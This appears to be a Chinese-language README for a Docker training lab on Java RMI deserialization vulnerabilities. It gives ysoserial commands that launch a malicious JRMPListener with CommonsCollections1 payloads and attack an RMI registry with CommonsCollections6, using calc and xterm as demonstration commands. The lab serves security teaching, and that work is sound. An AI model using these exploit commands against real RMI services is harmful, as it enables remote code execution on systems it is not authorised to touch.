RMI 反序列化漏洞实验

本Docker服务包含多个RMI反序列化实验场景，分别对应不同的端口和服务类型。

实验一：JRMPListener 服务端 1099 / 1100

利用ysoserial的JRMPListener启动恶意RMI服务端，等待客户端连接后返回CC1链payload执行命令。

# 启动恶意RMI服务端 (1099端口执行calc)
java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 "calc"

# 备用端口 1100 (执行xterm)
java -jar ysoserial.jar JRMPListener 1100 CommonsCollections1 "xterm"
效果：Windows弹计算器 / Linux开终端
实验二：注册表绑定漏洞 3099

RMI注册表直接绑定恶意序列化对象，当客户端查询时返回payload触发反序列化漏洞。

# 使用ysoserial攻击注册表
java -jar ysoserial.jar RMIRegistryExploit target-ip 3099 CommonsCollections6 "calc"
效果：客户端连接即触发，无需等待JRMP响应
实验三：RMI客户端攻击 client/

使用Class06客户端程序连接恶意RMI服务端（1099/1100），触发客户端反序列化漏洞。

# 运行RMI客户端 (需JDK 1.8)
java -jar rmi-client.jar
# 输入: rmi://target-ip:1099/Hello
效果：客户端反序列化服务端返回的数据 → 命令执行
实验四：正常RMI服务 2099 / 2100

标准RMI注册表服务，用于对比学习正常RMI通信流程。

# 正常连接测试
rmiregistry 2099
# 或使用客户端连接
java -cp client.jar java.rmi.registry.LocateRegistry...
效果：返回正常Java对象，无漏洞
⚠️ 重要提示：
• 请使用 JDK 1.8 版本进行实验
• 靶场源码位于 Class05 RMI - 靶场源代码/ 目录
• 客户端程序位于 client/rmi-client.jar
